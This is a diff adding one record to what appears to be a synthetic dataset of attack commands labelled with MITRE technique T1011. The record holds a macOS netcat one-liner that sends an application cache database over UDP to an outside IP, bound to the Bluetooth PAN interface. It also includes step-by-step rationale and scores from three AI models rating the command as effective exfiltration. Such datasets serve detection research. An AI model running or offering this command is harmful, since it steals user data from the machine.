@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
+  "explanation": "Sends a file via UDP bound to the Bluetooth PAN address, leveraging a non-primary medium consistent with T1011.",
+  "rationale_steps": [
+    "Resolve Bluetooth PAN IP using networksetup",
+    "Bind UDP socket to that IP with netcat",
+    "Transmit data to a non-standard UDP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-9b5bbd03",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid nc flags, balanced quoting and command substitution, and correct input redirection, making it parseable as-is.",
+        "semantic_score": 4,
+        "semantic_justification": "It transmits the file over UDP bound to the Bluetooth PAN IP as claimed, but it lacks automation elements (e.g., scheduling/retries/batching) expected for T1011 Automated Exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-01T02:31:46.745283Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat, correct use of command substitution, and proper escaping of spaces in the file path.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by using netcat to transfer a database file over UDP from a specific source IP (Bluetooth PAN) to an external server, which aligns perfectly with the T1011 technique of automated data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:31:50.578190Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command substitution, piping, input redirection, and proper escaping for file paths with spaces.",
+        "semantic_score": 5,
+        "semantic_justification": "The command semantically aligns perfectly with the claimed intent to exfiltrate a file via UDP, binding to the Bluetooth PAN interface, which is consistent with leveraging a non-primary medium for automated exfiltration (T1011).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:32:03.700780Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
